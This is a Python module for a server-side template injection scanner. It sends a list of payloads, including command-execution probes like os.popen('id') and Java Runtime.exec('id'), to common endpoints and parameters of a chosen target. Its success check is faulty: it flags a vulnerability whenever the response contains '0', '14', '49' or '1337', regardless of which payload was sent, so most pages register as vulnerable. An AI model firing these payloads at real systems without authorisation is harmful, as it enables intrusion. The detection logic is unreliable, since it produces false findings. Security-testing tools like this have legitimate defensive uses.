import requests
import os
from urllib.parse import urljoin, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from config import HTTP_HEADERS, DEFAULT_TIMEOUT
from module.other import Other

class SSTIScanner:
    SSTI_PAYLOADS = [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "${{7*7}}", "{{7+7}}",
        "{{7-7}}", "{{7/1}}", "{{1337*0}}", "{{ [].__class__.__mro__[1].__subclasses__() }}",
        "{{ ''.__class__.__mro__[2].__subclasses__() }}", "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        "{{ self.__init__.__globals__.os.popen('id').read() }}",
        "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
        "{% print(7*7) %}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#set($x=7*7)$x", "{{ config.items() }}", "{{ request['application'].__globals__['os'].popen('id').read() }}",
        "<%= Runtime.getRuntime().exec('id') %>", "${@print(7*7)}"
    ]

    COMMON_PARAMS = [
        "name", "user", "q", "search", "lang", "query", "page", "input",
        "message", "title", "desc", "text", "keyword", "comment", "data"
    ]

    COMMON_ENDPOINTS = [
        "/", "/search", "/view", "/page", "/profile", "/comment", "/feedback", "/api", "/form"
    ]

    def __init__(self, args):
        self.target = f"http://{args.target}".rstrip("/")
        self.thread = args.threads
        self.session = requests.Session()
        self.session.headers.update(HTTP_HEADERS)
        self.module_name = os.path.splitext(os.path.basename(__file__))[0]
        self.printer = Other()

    def scan(self):
        results = []
        tasks = []
        colored_module = self.printer.color_text(self.module_name, "cyan")

        with ThreadPoolExecutor(max_workers=self.thread) as executor:
            for endpoint in self.COMMON_ENDPOINTS:
                url = urljoin(self.target, endpoint)
                for param in self.COMMON_PARAMS:
                    for payload in self.SSTI_PAYLOADS:
                        for method in ["GET", "POST"]:
                            tasks.append(executor.submit(
                                self._send_request, method, url, endpoint, param, payload
                            ))

            for future in as_completed(tasks):
                res = future.result()
                if res:
                    colored_endpoint = self.printer.color_text(res['endpoint'], "yellow")
                    print(f"[!] [Module: {colored_module}] SSTI detected on {colored_endpoint} param={res['param']} payload={res['payload']}")
                    results.append(res)

        if not results:
            print(f"[*] [Module: {colored_module}] No SSTI vulnerabilities detected.")

        return {"target": self.target, "ssti_findings": results}

    def _send_request(self, method, url, endpoint, param, payload):
        data = {param: payload}
        try:
            if method == "GET":
                full_url = f"{url}?{urlencode(data)}"
                r = self.session.get(full_url, timeout=DEFAULT_TIMEOUT)
            else:
                r = self.session.post(url, data=data, timeout=DEFAULT_TIMEOUT)

            if self._is_ssti_success(payload, r.text):
                return {
                    "endpoint": endpoint,
                    "method": method,
                    "param": param,
                    "payload": payload,
                    "status": r.status_code,
                    "match": self._match_output(payload, r.text)
                }

        except Exception:
            return None

    def _is_ssti_success(self, payload, response_text):
        return self._match_output(payload, response_text) is not None

    def _match_output(self, payload, response_text):
        indicators = ["49", "14", "0", "1337"]
        for val in indicators:
            if val in response_text:
                return val
        return None

def scan(args=None):
    return SSTIScanner(args).scan()
